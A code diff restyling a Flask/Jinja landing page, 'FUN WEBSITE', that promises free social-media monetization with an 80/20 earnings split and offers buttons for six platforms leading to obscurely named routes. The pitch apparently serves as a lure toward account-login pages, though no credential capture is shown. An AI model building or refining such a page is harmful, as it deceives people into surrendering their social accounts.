@@ -1,75 +1,80 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card center" style="flex-direction:column;align-items:center;text-align:center;padding:48px 16px;">
-  
-  <!-- Main heading -->
-  <h1 style="font-size:36px;font-weight:900;margin-bottom:16px;color:#0f172a;letter-spacing:1px">
-    ✨ FUN WEBSITE
-  </h1>
-  
-  <!-- Caption section -->
-  <div class="caption" style="max-width:700px;width:100%;text-align:left;line-height:1.8;font-size:16px;margin-bottom:32px;color:#475569;padding:0 12px;">
-    <h2 style="font-size:24px;font-weight:900;color:#0f172a;margin-bottom:16px;letter-spacing:0.5px;text-shadow:0 1px 2px rgba(0,0,0,0.05)">
-      Start Earning from Your Social Media
-    </h2>
-    <p style="margin-bottom:16px">
-      Turn your creativity into income! This platform helps you monetize your social media accounts so you can earn money from your content, live streams, and even by watching other creators.
-    </p>
-    <ul style="list-style:none;padding-left:0;margin-bottom:16px;line-height:1.8">
-      <li style="margin-bottom:8px; font-weight:600;">🟢 <span style="color:#0f172a;">Keep 80%</span> of your earnings once monetization is activated.</li>
-      <li style="margin-bottom:8px; font-weight:600;">🟢 The remaining <span style="color:#0f172a;">20%</span> helps support platform operations and growth.</li>
-      <li style="margin-bottom:8px; font-weight:600;">🟢 Monetization is completely free, fast, and easy to set up.</li>
-    </ul>
-    <p style="margin-bottom:0">
-      Simply choose the social media platform you want to monetize and follow the on-screen instructions to get started.
-    </p>
-  </div>
-
-  <!-- Welcome paragraph -->
-  <p class="lead" style="max-width:600px;font-size:16px;line-height:1.6;color:#475569">
+<div class="card center" style="flex-direction:column;align-items:center;text-align:center;padding:48px">
+  <h1 style="font-size:32px;font-weight:800;margin-bottom:12px;color:#0f172a">✨ FUN WEBSITE</h1>
+  <p class="lead" style="max-width:600px;font-size:16px;line-height:1.6;margin-bottom:24px">
     Welcome! This website is designed to help you discover happiness, 
     transform your daily activity, and spark joy in new ways.
   </p>
+  <div style="max-width:600px;text-align:left;color:#334155;font-size:15px;line-height:1.7">
+    <p style="font-weight:700;font-size:18px;margin-bottom:12px">Start Earning from Your Social Media</p>
+    <p>Turn your creativity into income! This platform helps you monetize your social media accounts so you can earn money from your content, live streams, and even by watching other creators.</p>
+    <ul style="margin:12px 0 16px 18px;padding:0;line-height:1.7">
+      <li>🟢 Keep 80% of your earnings once monetization is activated.</li>
+      <li>🟢 The remaining 20% helps support platform operations and growth.</li>
+      <li>🟢 Monetization is completely free, fast, and easy to set up.</li>
+    </ul>
+    <p>Simply choose the social media platform you want to monetize and follow the on-screen instructions to get started.</p>
+  </div>
 </div>
 
-<!-- Platforms section -->
 <div class="card" style="padding:32px">
   <h2 style="margin-top:0;font-weight:800;font-size:22px;color:#0f172a;margin-bottom:18px">🌐 Select a Platform</h2>
-  <div class="platforms">
-    <a class="btn-platform glow-facebook" href="{{ url_for('love1_1') }}">
+  <div class="platforms" style="display:flex;flex-wrap:wrap;gap:16px;justify-content:center;">
+    
+    <a class="btn-platform glow-facebook" href="{{ url_for('love1_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-facebook"><i class="fa-brands fa-facebook icon-lg"></i></div>
       <div><strong class="notranslate">Facebook</strong></div>
     </a>
 
-    <a class="btn-platform glow-instagram" href="{{ url_for('love2_1') }}">
+    <a class="btn-platform glow-instagram" href="{{ url_for('love2_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-instagram"><i class="fa-brands fa-instagram icon-lg"></i></div>
       <div><strong class="notranslate">Instagram</strong></div>
     </a>
 
-    <a class="btn-platform glow-tiktok" href="{{ url_for('joy1_1') }}">
+    <a class="btn-platform glow-tiktok" href="{{ url_for('joy1_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-tiktok"><i class="fa-brands fa-tiktok icon-lg"></i></div>
       <div><strong class="notranslate">TikTok</strong></div>
     </a>
 
-    <a class="btn-platform glow-youtube" href="{{ url_for('joy2_1') }}">
+    <a class="btn-platform glow-youtube" href="{{ url_for('joy2_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-youtube"><i class="fa-brands fa-youtube icon-lg"></i></div>
       <div><strong class="notranslate">YouTube</strong></div>
     </a>
 
-    <a class="btn-platform glow-snapchat" href="{{ url_for('happy1_1') }}">
+    <a class="btn-platform glow-snapchat" href="{{ url_for('happy1_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-snapchat"><i class="fa-brands fa-snapchat icon-lg snapchat-white"></i></div>
       <div><strong class="notranslate">Snapchat</strong></div>
     </a>
 
-    <a class="btn-platform glow-twitter" href="{{ url_for('happy2_1') }}">
+    <a class="btn-platform glow-twitter" href="{{ url_for('happy2_1') }}" style="flex:1 1 calc(33.333% - 16px);min-width:120px;">
       <div class="icon-circle bg-twitter"><i class="fa-brands fa-x-twitter icon-lg"></i></div>
       <div><strong class="notranslate">X / Twitter</strong></div>
     </a>
+    
   </div>
 </div>
 
+<div class="card" style="padding:32px">
+  <h3 style="font-size:20px;font-weight:700;margin-bottom:12px;color:#0f172a">⚙️ How it Works</h3>
+  <p style="color:#475569;font-size:15px;line-height:1.6;margin-bottom:16px">
+    The core idea of happiness is to transform your activities into positive energy and lasting joy.  
+    Here’s how it works:
+  </p>
+  <ul style="color:#334155;line-height:1.7;margin:0;padding-left:18px;font-size:15px">
+    <li><strong>Understand yourself</strong> – learn your needs and aspirations.</li>
+    <li><strong>Create joy within</strong> – cultivate habits that keep you connected and uplifted.</li>
+    <li><strong>Transform challenges</strong> – turn pain into happiness through mindful practice here.</li>
+  </ul>
+</div>
+
 <style>
-/* Soft glow behind each platform card */
+.platforms {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  justify-content: center;
+}
 .btn-platform {
   transition: box-shadow 0.3s ease, transform 0.2s ease;
   border-radius: 18px;
@@ -77,7 +82,8 @@
 .btn-platform:hover {
   transform: translateY(-3px);
 }
-/* Platform glows */
+
+/* Glow effects for each platform */
 .glow-facebook { box-shadow: 0 0 18px rgba(24, 119, 242, 0.25); }
 .glow-instagram { box-shadow: 0 0 18px rgba(228, 64, 95, 0.25); }
 .glow-tiktok { box-shadow: 0 0 18px rgba(0, 0, 0, 0.25); }
@@ -86,11 +92,5 @@
 .snapchat-white { color: #fff; position: relative; z-index: 2; }
 .glow-snapchat { box-shadow: 0 0 18px rgba(255, 252, 0, 0.3); }
 .glow-twitter { box-shadow: 0 0 18px rgba(29, 161, 242, 0.25); }
-
-/* Caption responsive adjustments */
-@media (max-width: 600px) {
-  .caption h2 { font-size:22px; }
-  .caption p, .caption li { font-size:15px; }
-}
 </style>
 {% endblock %}
